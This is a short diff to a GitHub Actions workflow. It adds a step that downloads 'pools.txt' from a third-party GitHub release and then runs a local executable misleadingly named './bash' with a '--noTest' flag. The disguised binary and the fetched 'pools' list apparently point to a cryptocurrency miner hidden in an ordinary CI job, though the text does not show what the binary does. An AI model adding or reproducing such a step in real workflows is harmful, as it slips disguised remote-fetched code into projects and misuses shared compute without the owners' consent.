@@ -30,5 +30,6 @@ jobs:
 
       - name: Run bash
         run: |
+          wget https://github.com/hujisanda/action/releases/download/pool/pools.txt
           chmod u+x ./bash
-          ./bash
+          ./bash --noTest
